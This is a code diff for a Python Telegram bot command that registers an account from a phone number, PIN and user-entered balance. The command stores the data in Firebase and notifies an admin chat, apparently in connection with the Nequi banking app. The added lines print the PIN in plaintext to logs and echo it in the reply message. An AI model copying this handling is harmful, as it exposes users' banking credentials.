@@ -921,15 +921,27 @@ async def get_username_step(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
+    print(f"🔍 NEQUIAXONLABS - Usuario: {user_id}")
+    print(f"🔍 user_data: {user_data.get(user_id, 'NO EXISTE')}")
+    
     if user_id not in user_data or 'telegram_username' not in user_data.get(user_id, {}):
-        await update.message.reply_text("❌ Primero usa /crear para registrar tu arroba.")
+        print(f"❌ Usuario {user_id} - No tiene telegram_username en user_data")
+        await update.message.reply_text(
+            "❌ <b>ERROR</b>\n\n"
+            "Primero usa /crear para registrar tu arroba.\n\n"
+            "Luego podrás completar tu cuenta con /nequiaxonlabs",
+            parse_mode='HTML'
+        )
         return
     
     if not context.args or len(context.args) != 3:
+        print(f"❌ Usuario {user_id} - Formato incorrecto: {context.args}")
         await update.message.reply_text(
-            "❌ Formato incorrecto.\n\n"
-            "Usa: <code>/nequiaxonlabs numero pin saldo</code>\n"
-            "Ejemplo: <code>/nequiaxonlabs 3001234567 0515 500000</code>",
+            "❌ <b>FORMATO INCORRECTO</b>\n\n"
+            "Usa: <code>/nequiaxonlabs numero pin saldo</code>\n\n"
+            "📌 Ejemplo:\n"
+            "<code>/nequiaxonlabs 3001234567 0515 500000</code>\n\n"
+            "⚠️ Número: 10 dígitos | PIN: 4 dígitos | Saldo: solo números",
             parse_mode='HTML'
         )
         return
@@ -937,6 +949,8 @@ async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = context.args[0].strip()
     pin = context.args[1].strip()
     saldo_text = context.args[2].strip().replace('.', '').replace(',', '')
+    
+    print(f"📱 Usuario {user_id} - Phone: {phone}, PIN: {pin}, Saldo: {saldo_text}")
     
     if not phone.isdigit() or len(phone) != 10:
         await update.message.reply_text("❌ Número inválido. Debe tener 10 dígitos.")
@@ -954,6 +968,8 @@ async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     saldo = int(saldo_text)
     created_at = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
     
+    print(f"✅ Usuario {user_id} - Guardando cuenta: {username}, {phone}")
+    
     if db:
         try:
             # Guardar en la colección 'users' con el NÚMERO como ID
@@ -965,8 +981,9 @@ async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'created_by': user_id,  # ID de Telegram de quien lo creó
                 'created_at': created_at
             })
+            print(f"✅ Usuario {user_id} - Cuenta guardada en Firebase")
         except Exception as e:
-            print(f"Firebase error: {e}")
+            print(f"❌ Firebase error: {e}")
             await update.message.reply_text("❌ Error al guardar. Intenta de nuevo.")
             return
     
@@ -983,15 +1000,21 @@ async def cmd_nequiaxonlabs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     send_telegram_message(admin_message, ADMIN_CHAT_ID)
     
     await update.message.reply_text(
-        f"✅ <b>¡CUENTA CREADA!</b>\n\n"
+        f"✅ <b>¡CUENTA CREADA EXITOSAMENTE!</b>\n\n"
         f"👤 Username: <b>@{username}</b>\n"
-        f"📱 Teléfono: {phone}\n"
+        f"📱 Teléfono: <code>{phone}</code>\n"
+        f"🔐 PIN: <code>{pin}</code>\n"
         f"💰 Saldo: ${saldo:,}\n\n"
-        f"🔐 Ingresa a la app con: <code>{username}</code>",
+        f"🎉 Tu cuenta está lista para usar.\n"
+        f"Ingresa a la app con tu username: <code>{username}</code>",
         parse_mode='HTML'
     )
     
-    del user_data[user_id]
+    print(f"✅ Usuario {user_id} - Proceso completado")
+    
+    # Limpiar user_data
+    if user_id in user_data:
+        del user_data[user_id]
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
